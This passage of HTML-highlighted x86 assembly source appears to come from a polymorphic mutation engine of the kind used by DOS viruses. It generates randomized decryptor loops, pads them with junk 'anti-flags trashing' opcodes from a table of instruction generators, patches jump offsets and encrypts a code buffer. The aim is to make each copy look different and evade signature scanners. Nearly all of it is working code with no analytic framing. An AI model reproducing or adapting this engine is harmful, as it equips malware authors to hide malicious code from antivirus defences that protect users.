    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Dec Counter</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Inc Pointer</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Inc Pointer</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyWord</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Add KeyWord,AddNum</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AddCr</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Or Counter,Counter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MinGarb</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Fill with anti-flags</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">             </span><span class="sc1">; trashing code.</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">MakeItq</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FFriendly</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">MakeItq</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JCnt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Jne xx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JnePat</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Jmp AllDone</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">EndPt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">Dec</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JCnt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JnePat</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Patch Jne</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Jmp Loop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LoopSt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">; Patch for End of decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">EndPt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">; Patch for End of decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CallP</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldDi</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldcx</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Crypt Source</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldsi</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">BegCr</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CryptIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc5">Patchit</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C3h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AddCr</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CryptIt</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FinishJob</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">olddi</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Calculate new size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldcx</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldcx</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">smm</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetReg16</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Keyword</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv2</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">BadReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetReg16</span><span class="sc0">
</span><span class="sc5">GetReg16</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetSize</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">NoCheckIt</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Byte2</span><span class="sc0">

</span><span class="sc5">NoCheckIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Byte0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Byte1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Byte0</span><span class="sc0">
</span><span class="sc5">Byte2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">Byte1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">Byte0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetSize</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetReg8</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoSub3</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">NoSub3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg8</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg8</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyWord</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg8</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv2</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadReg8</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">BadReg8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetReg8</span><span class="sc0">
</span><span class="sc5">GetReg8</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MGarb</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JCnt</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; Make garbage</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Minimum</span><span class="sc0">             </span><span class="sc1">; If there any 8bit jumps ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MaxGarb</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; No - give maximum garbage</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MakeGrb</span><span class="sc0">
</span><span class="sc5">Minimum</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MinGarb</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Else - give minimum garbage</span><span class="sc0">
</span><span class="sc5">MakeGrb</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">             </span><span class="sc1">; Get rnd from 0 to GarbSize</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Increase to skip zero</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Cx = Ax</span><span class="sc0">
</span><span class="sc5">CreateIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GG</span><span class="sc0">                 </span><span class="sc1">; Make opcode</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CreateIt</span><span class="sc0">               </span><span class="sc1">; Next one</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MGarb</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MTable</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Main table</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TwoThreeFour16</span><span class="sc0">       </span><span class="sc1">; 16bit diff. size opcodes</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Imm16</span><span class="sc0">            </span><span class="sc1">; Immediatly 16bit regs moves</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AxZero</span><span class="sc0">           </span><span class="sc1">; Inc/Dec 16 bit regs</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AxXchg</span><span class="sc0">           </span><span class="sc1">; Xchg Ax,Reg</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AxImm16</span><span class="sc0">          </span><span class="sc1">; Ax reg opcodes generation</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jxx</span><span class="sc0">          </span><span class="sc1">; Case jumps creation</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MakeCall</span><span class="sc0">         </span><span class="sc1">; Procedure creation</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PFCall</span><span class="sc0">           </span><span class="sc1">; Patch forward call</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MakeInt</span><span class="sc0">          </span><span class="sc1">; Int encode</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TwoThreeFour8</span><span class="sc0">        </span><span class="sc1">; 8Bit diff. size opcodes</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PutCall</span><span class="sc0">          </span><span class="sc1">; Put call to procedures</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">         </span><span class="sc1">; Immediatly 8bit opcodes</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OneByters</span><span class="sc0">        </span><span class="sc1">; One-Byters</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FCall</span><span class="sc0">            </span><span class="sc1">; Create forward call</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MakeRol</span><span class="sc0">          </span><span class="sc1">; Shl/Shr/Sar/Rol/etc..</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MakeIn</span><span class="sc0">           </span><span class="sc1">; In Al,Port8</span><span class="sc0">
</span><span class="sc5">TEntries</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Oldz</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">GG</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">GGz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoGarb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">TEntries</span><span class="sc0">             </span><span class="sc1">; Any reserved register used ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ResV</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; If yes, dont use 8 bit</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Subitq</span><span class="sc0">              </span><span class="sc1">; codes and call creation.</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ResV2</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
